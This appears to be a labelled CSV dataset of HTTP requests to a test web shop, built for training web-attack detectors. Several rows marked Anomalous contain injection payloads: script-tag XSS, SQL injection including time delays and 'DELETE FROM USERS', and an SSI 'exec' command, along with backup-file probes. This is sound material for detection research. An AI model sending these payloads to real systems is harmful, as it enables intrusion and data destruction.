label,method,url,http_version,host,user_agent,pragma,cache_control,accept,accept_encoding,accept_charset,language,cookie,content_type,content_length,connection,body,classification
Anomalous,GET,/tienda1/global/estilos.css.bak,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=1B39270727272283593ABFCE4CA0E358,,,close,,1
Anomalous,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=benefiel&pwd=duc9i89&remember=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=B94733D7AC80E8CFC59A200EB8C8F156,,,close,,1
Normal,GET,/tienda1/publico/registro.jsp?modo=registro&login=vilma&password=me9ieval&nombre=Egle&apellidos=Carulla&email=hussenot%40habitaciondepanico.cl&dni=49645694X&direccion=C%2F+Font+Flavia%2C+14%2C+6C&ciudad=Abla&cp=39500&provincia=Albacete&ntc=1075444051965041&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=95C4CF4DFDDF7D9E61510DB77373B2CA,,,close,,0
Normal,GET,/tienda1/publico/registro.jsp?modo=registro&login=malott&password=guayabo&nombre=Dalmiro&apellidos=Farr%E9&email=haddon%40hiperbarcelona.tl&dni=29424173C&direccion=Plza.+Luis+Cernuda%2C+88+&ciudad=Villodrigo&cp=08580&provincia=Sevilla&ntc=0604900519989178&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=F44B1D4E8EFDB93F7FCCB63A662B1547,,,close,,0
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=2373&B1=Confirmar%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=B96E13E962C95934B0EB31798876A707,,,close,,1
Anomalous,GET,/tienda1/publico/miembros.jsp/.OLD,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=3089C692E736A3C9B5E9A3DE07D7B79D,,,close,,1
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=rici&password=aguiscar&nombre=C%E1stulo&apellidos=Errante+Bov%E9&email=porokhovschikov%40placeresadultos.st&dni=50383140F&direccion=Calle+De+San+Lorenzo+88%2C+4%3FE%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&ciudad=Bocairent&cp=32780&provincia=C%E1ceres&ntc=2213817508250082&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=B60CC007643E6B821D0DC63CD9B5F4FA,,,close,,1
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=mim&password=chapurrar&nombre=Bucardo&apellidos=Colomer+Mars&email=miramon%40logiteclines.rs&dni=45794073S&direccion=Calle+Roncesvalls+8%2C+&ciudad=Wamba&cp=27113&provincia=Lleida&ntc=1539157605114970&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=FD81325C19CFABE25EC0BBBC5A1761BD,,,close,,0
Anomalous,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=chihchie&pwd=s927r%ED9i0o&remember=off&B1A=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=F50728A2F05AAD5482504D594393305A,,,close,,1
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=woolwine0&password=ENJaLBEgar&nombre=Dositeo&apellidos=Scardetta+Huerta&email=kastner.matsuzaka%40graficascamp.py&dni=44392621E&direccion=Pla%E7a+Mig+De+Can+Clos%2C+122+&ciudad=Olmos+de+Esgueva&cp=14810&provincia=Burgos&ntc=4568588143966075&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=0EEBD759B96DE5546452D639856D15E0,,,close,,0
Normal,GET,/tienda1/publico/registro.jsp?modo=registro&login=tapani9&password=v1itu1llar&nombre=Norma&apellidos=Salas+Solmoirago&email=chancer%40gestionsoftware.mq&dni=70304292P&direccion=Calle+Espi%F1o%2C+120%2C+11%3FA&ciudad=Zaldibia&cp=08256&provincia=Le%F3n&ntc=3644619165176311&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=C0DCBE43F4E669A30BBEE11F83F2DC87,,,close,,0
Normal,GET,/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=9&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=C80EE476FE31F8DFE02A418832278CBF,,,close,,0
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=mcduffie&password=manganEar&nombre=Wayca&apellidos=Dabbas+Hurtado&email=brooking-doolittle%40encuentrodominios.lv&dni=76518142V&direccion=Sierra+Bermeja+S%2FN%2C+&ciudad=Ajamil&cp=15873&provincia=Almer%EDa&ntc=0567191601469528&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=055244D9A15B53DD96B75CA143D2DB38,,,close,,0
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=kathrine&password=0ntrecerrar&nombre=Ermin&apellidos=Blotta+Azagra&email=smethurst-salvador%40mcrspain.vn&dni=46324867S&direccion=Pla%E7a+Adria+152%2C+&ciudad=Frigiliana&cp=19327&provincia=Le%F3n&ntc=5695809811217784&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=053CD6A1A847AB99EA5081D6C480A5EA,,,close,,0
Normal,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=bili&pwd=pospalatal&remember=off&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=4B3FFF23304DC6C8083D388E05F1F01D,,,close,,0
Normal,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=3059&B1=Pasar+por+caja,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=4ACA5006E44ACD359F48B813FA9D739D,,,close,,0
Anomalous,GET,/tienda1/imagenes/1.gif/4861362529278789730.Inc,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=C28806507AE695DAFB51FF4904880158,,,close,,1
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=briard&password=ur7anismo&nombre=Vital&apellidos=Bonafina+Cansino&email=%40%40aimarsen%40provider.%40com.mil&dni=65630152C&direccion=C%2F+Marques+De+Lema+188+13G&ciudad=Rueda+de+Jal%F3n&cp=03510&provincia=Le%F3n&ntc=7816475254908142&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=A48D187838EC0B29A6750380D7F69E73,,,close,,1
Anomalous,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=beate&pwd=esp8rtillero&rememberA=off&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=D5F09FDD7CFDFEB474A0B247137C5CC5,,,close,,1
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=reinhard&password=gorrero&nombre=Sabel&apellidos=Padr%F3+Pavajeau&email=eccles%40aspirantes.gh&dni=72523597C&direccion=Moraira+185%2C+&ciudad=Cebrones+del+R%EDo&cp=25617&provincia=Guadalajara&ntc=0893945403405745&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=12AE3C6D9F5844426B71A8AD7585986E,,,close,,0
Anomalous,GET,/tienda1/publico/registro.jsp?modo=registro&login=amant&password=coyotera&nombre=Aleardo&apellidos=Sellares+Brihuega&email=miguel_bridge%40irmedia.nl&dni=15074727K&direccion=Calle+Rodrigo+De+Triana+189%2C+6E&ciudad=Ametlla+del+Vall%E8s%2C+L%27&cpA=44597&provincia=Guadalajara&ntc=2988316222731904&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=AA80E57450AA16E710D1060BA55ECEB4,,,close,,1
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=massinga&password=reSPALdar&nombre=Peregrino&apellidos=O%F1ate+Leguisamo&email=armida%40automovilesalhambra.pl&dni=65278169Y&direccion=C%2F+Canal%2C+25%2C+9%3FF&ciudad=Azkoitia%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&cp=38911&provincia=Salamanca&ntc=4593527781788646&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=176621106138E85EC3820B72EF091121,,,close,,1
Anomalous,GET,/tienda1/publico/anadir.jsp?id=2%2F&nombre=Queso+Manchego&precio=39&cantidad=21&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=27308423A2532FE601BEE0996C399A90,,,close,,1
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=etoh&password=3Nt783E68r&nombre=Tatiano&apellidos=Renilla+Currius&email=sovagovic%40engomera.com.vc&dni=57024590T%27OR%27a%3D%27a&direccion=Vera+De+Bidasoa+115%2C+6%3FC&ciudad=Lizo%E1in&cp=10520&provincia=Zamora&ntc=0723351625880614&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=A244C30ABA5DC26118251658B009C913,,,close,,1
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=rintel&password=7a03i9a08RIO&nombre=Zenaida&apellidos=Baeza+Redon&email=long%40todomodelos.tg&dni=17103014F&direccion=Passatge+Permanyer%2C+53%2C+7D&ciudad=Urue%F1as&cp=34192&provincia=Salamanca&ntc=7402575875977830&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=6A480310542F6D9FAD01A1CD5E1B3DCC,,,close,,0
Normal,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=7549&B1=Pasar+por+caja,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=A770C3014FBB9805B794590BBDCA66F9,,,close,,0
Normal,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=4364&B1=Pasar+por+caja,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=505F07B6CDCEC0981BF9A99F4249AD6E,,,close,,0
Anomalous,GET,/tienda1/publico/registro.jsp?modo=registro&login=correa&password=5orTeRa&nombre=Fructuosa&apellidos=Polloni+Homdedeu&email=berto%40sindualidad.dd&dni=49742539W&direccion=C%2F+Einstein%2C+147%2C+9%3FA&ciudad=Legazpi&cp=44349%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&provincia=Valencia&ntc=2169388539628734&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=FC2C84FFAD872D820BA7667EB0CB355E,,,close,,1
Normal,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=289&B1=Pasar+por+caja,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=234BD66E8621610C9E86F2B5B3F1B366,,,close,,0
Anomalous,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=anabal&pwdA=somn%E1mbula&remember=on&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=E3E411796DE6B54E3A191669151ED549,,,close,,1
Anomalous,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=crickard&pwd=%27+DELETE+FROM+USERS&remember=off&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=B7520B65A69B596088B1C983C148D60B,,,close,,1
Normal,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=ryan&pwd=fErrErUelO&remember=off&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=9954405A87B5E790C483A9FD83F0C31F,,,close,,0
Anomalous,GET,/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=68&B1A=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=E82F2346C0F52290AA1238BF3F9C4CB6,,,close,,1
Anomalous,GET,/tienda1/publico/autenticar.jsp?modo=%27INJECTED_PARAM&login=devore&pwd=por35zo&remember=on&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=F2F7B13EF1C1DDC99A897DCC8153D14C,,,close,,1
Anomalous,GET,/tienda1/imagenes/logo.gif/asf-logo-wide.gif/.Bak,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=88A76F1029A1CBE875A3A40072DD572C,,,close,,1
Anomalous,GET,/tienda1/publico/4861362529278789730.bak,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=57F6E20E4433DD355D6758307AF0E6A4,,,close,,1
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=veit&password=GamoNOSA&nombre=Flaviano&apellidos=Rib%F3+Cruanas&email=filogamo%40copiar.com.nu&dni=23865566F&direccion=Carrer+Pompeu+Fabra%2C+151%2C+&ciudad=Madrigal+del+Monte&cp=01139&provincia=Burgos&ntc=2938010074996541&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=528064EBC1097362623937B25B11D8FC,,,close,,0
Normal,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=lowietje&pwd=ex074ico&remember=off&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=49DC0C63B4B566527AC5CA95586898A4,,,close,,0
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=pammie&password=V%24Idr3Ar&nombre=Sayara&apellidos=Cagnoli&email=clavering%40pinturasultravioleta.pro&dni=63829565B&direccion=Aurora+Bertrana+Salazar+10+3-C&ciudad=Hornos&cp=45634&provincia=Valladolid&ntc=4226046499602528&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=AB885A3C240BE72E7B7C154184605323,,,close,,0
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=eppe%2Fr%2Fs*on&password=pisa-verde&nombre=Vianella&apellidos=Galdeano+Piccech&email=dudgeon%40tradora.na&dni=80818838N&direccion=C%2F+Can+Petit+42%2C+10-F&ciudad=Gormaz&cp=32737&provincia=Zaragoza&ntc=0673547824413217&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=66DD5D6DC508E376B0A903D43A886B78,,,close,,1
Normal,GET,/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=41&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=CE077FB5EEFFF1D8DB1703ECE1E6EE1C,,,close,,0
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=schulz&password=estAFeTiL&nombre=Remberta&apellidos=Saluotto+Cunill&email=fant%40tiposdedrogas.gg&dni=62364423S&direccion=C%2F+Jardins+De+Caterina+Albert+149%2C+&ciudad=Montmell%2C+El&cp=37217&provincia=Guadalajara&ntc=0896066292331731&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=6A50A09818870710DFCE524FB5A82B95,,,close,,0
